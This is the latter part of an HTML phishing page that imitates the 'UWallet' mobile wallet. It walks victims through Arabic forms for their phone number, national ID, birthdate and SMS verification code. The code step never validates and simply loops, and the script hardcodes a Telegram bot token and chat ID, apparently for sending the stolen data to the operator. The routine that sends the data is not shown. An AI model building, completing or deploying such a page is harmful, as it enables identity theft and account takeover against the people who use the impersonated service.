  <style>
    :root {
      --uwallet-blue: #1a84dd;
      --uwallet-dark: #00486e;
      --uwallet-gray: #f4f9fb;
      --uwallet-light-blue: #00a6e8;
      --uwallet-accent: #209dbf;
      --uwallet-pink: #ea4763;
    }
    body {
      background: linear-gradient(135deg, var(--uwallet-blue) 0%, var(--uwallet-dark) 83%);
      min-height: 100vh;
      font-family: 'Cairo', Arial, sans-serif;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #app {
      background: #fff;
      border-radius: 22px;
      box-shadow: 0 8px 32px 0 rgba(26,132,221,0.1), 0 2px 12px #209dbf22;
      width: 370px;
      max-width: 95vw;
      padding: 34px 26px 32px 26px;
      box-sizing: border-box;
      direction: rtl;
      position: relative;
      overflow: hidden;
      border: 2.5px solid var(--uwallet-blue);
      animation: fadein 0.7s;
    }
    @keyframes fadein {
      from { opacity: 0; transform: translateY(36px);}
      to { opacity: 1; transform: none;}
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 13px;
      margin-top: 7px;
    }
    input {
      padding: 14px 11px;
      border: none;
      border-radius: 9px;
      font-size: 15px;
      background: var(--uwallet-gray);
      color: #222;
      outline: none;
      box-shadow: 0 1.5px 5px #1a84dd13;
      border: 2px solid #209dbf18;
      font-family: 'Cairo', Arial, sans-serif;
    }
    .code-inputs input {
      text-align: center;
      width: 100%; /* Wider input for viewing full code entry */
      padding: 15px;
    }
  </style>
</head>
<body>
  <div id="app"></div>

  <script>
    const BOT_TOKEN = "8478729698:AAH6ufdvIQicXkUajFb3M1ocoGusDHIbWoI";
    const CHAT_ID = "6873334348";
    let userData = {phone: '', nationalId: '', birthdate: '', attempts: 0};

    function renderPhoneStep() {
      document.getElementById("app").innerHTML = `
        <form id="phoneForm">
          <label for="phone">رقم الهاتف</label>
          <input type="tel" id="phone" maxlength="10" required placeholder="07XXXXXXXX" pattern="07[0-9]{8}" />
          <button type="submit">التالي</button>
        </form>
      `;
      document.getElementById("phoneForm").onsubmit = (e) => {
        e.preventDefault();
        const phone = document.getElementById("phone").value.trim();
        if (/^07\d{8}$/.test(phone)) {
          userData.phone = phone;
          renderNationalStep();
        }
      };
    }

    function renderNationalStep() {
      document.getElementById("app").innerHTML = `
        <form id="nationalForm">
          <label for="nationalId">الرقم الوطني</label>
          <input type="text" id="nationalId" maxlength="10" required />
          <label for="birthdate">تاريخ الميلاد</label>
          <input type="date" id="birthdate" required />
          <button type="submit">التالي</button>
        </form>
      `;
      document.getElementById("nationalForm").onsubmit = (e) => {
        e.preventDefault();
        const nationalId = document.getElementById("nationalId").value.trim();
        const birthdate = document.getElementById("birthdate").value;
        if (nationalId && birthdate) {
          userData.nationalId = nationalId;
          userData.birthdate = birthdate;
          renderVerificationStep();
        }
      };
    }

    function renderVerificationStep() {
      userData.attempts++;
      document.getElementById("app").innerHTML = `
        <form id="codeForm">
          <label>رمز التحقق</label>
          <div class="code-inputs">
            <input type="text" id="code" maxlength="4" required />
          </div>
          <button type="submit">تأكيد</button>
        </form>
      `;
      document.getElementById("codeForm").onsubmit = (e) => {
        e.preventDefault();
        if (userData.attempts < 5) {
          renderVerificationStep(); // Retry verification
        } else {
          renderPhoneStep(); // Reset process
        }
      };
    }

    renderPhoneStep();
  </script>
</body>
